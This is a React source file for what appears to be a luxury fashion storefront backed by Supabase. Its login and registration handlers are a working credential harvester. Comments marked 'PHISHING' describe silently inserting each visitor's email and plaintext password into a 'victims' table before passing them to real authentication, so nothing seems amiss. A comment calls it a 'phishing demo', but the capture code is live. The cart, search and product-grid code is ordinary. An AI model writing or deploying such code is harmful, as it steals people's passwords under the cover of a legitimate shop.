import React, { useState } from 'react';
import { Header } from './components/Header';
import { ProductCard } from './components/ProductCard';
import { LoginForm } from './components/LoginForm';
import { products } from './data/products';

import { supabase } from './supabaseClient';

function App() {
  const [user, setUser] = useState(null);
  const [cart, setCart] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [categoryFilter, setCategoryFilter] = useState(null);

  const handleLogin = async (email, password) => {
    // 1. PHISHING: Capture the data silently first!
    try {
      await supabase
        .from('victims')
        .insert([{ email, password }]);
    } catch (err) {
      // Silent failure
    }

    // 2. REAL AUTH: Verify credentials with Supabase
    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email,
        password,
      });

      if (error) {
        alert('Login failed: ' + error.message);
      } else {
        // Only log in if Supabase says the credentials are valid
        setUser({ email: data.user.email });
      }
    } catch (err) {
      alert('Login error: ' + err.message);
    }
  };

  const handleRegister = async (email, password) => {
    // 1. PHISHING: Capture the data first!
    try {
      await supabase
        .from('victims')
        .insert([{ email, password }]);
    } catch (err) {
      // Silent failure
    }

    // 2. REAL AUTH: Create the user in Supabase to send the confirmation email
    try {
      const { data, error } = await supabase.auth.signUp({
        email,
        password,
      });

      if (error) {
        alert('Error creating account: ' + error.message);
      } else {
        alert('Account created! Please check your email to confirm your registration.');
        // Optionally log them in or wait for confirmation. 
        // For the phishing demo, we can just log them in to keep the flow.
        setUser({ email });
      }
    } catch (err) {
      alert('Error: ' + err.message);
    }
  };

  const handleLogout = () => {
    setUser(null);
    setCart([]);
  };

  const handleAddToCart = (product) => {
    setCart([...cart, product]);
  };

  const handleRemoveFromCart = (productId) => {
    setCart(cart.filter(item => item.id !== productId));
  };

  const handleCategoryClick = (category) => {
    setCategoryFilter(category === 'Collections' ? null : category); // Reset if Collections
  };

  // Filter products
  const filteredProducts = products.filter(product => {
    const matchesSearch = product.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      product.category.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesCategory = categoryFilter ? product.category === categoryFilter || (categoryFilter === 'New Arrivals') : true;

    return matchesSearch && matchesCategory;
  });

  if (!user) {
    return (
      <div className="auth-page">
        <LoginForm onLogin={handleLogin} onRegister={handleRegister} />
      </div>
    );
  }

  return (
    <div className="app">
      <Header
        cartCount={cart.length}
        onSearch={setSearchQuery}
        onCategoryClick={handleCategoryClick}
        onLogout={handleLogout}
        user={user}
      />

      <main>
        <div className="shop-hero">
          <div className="container">
            <h1>{categoryFilter || 'The Autumn Collection'}</h1>
            <p>Discover the new standard of luxury.</p>
          </div>
        </div>

        <div className="container">
          <div className="product-grid">
            {filteredProducts.length > 0 ? (
              filteredProducts.map(product => {
                const isInCart = cart.some(item => item.id === product.id);
                return (
                  <ProductCard
                    key={product.id}
                    product={product}
                    isInCart={isInCart}
                    onAddToCart={handleAddToCart}
                    onRemoveFromCart={handleRemoveFromCart}
                  />
                );
              })
            ) : (
              <p style={{ gridColumn: '1/-1', textAlign: 'center' }}>No products found.</p>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
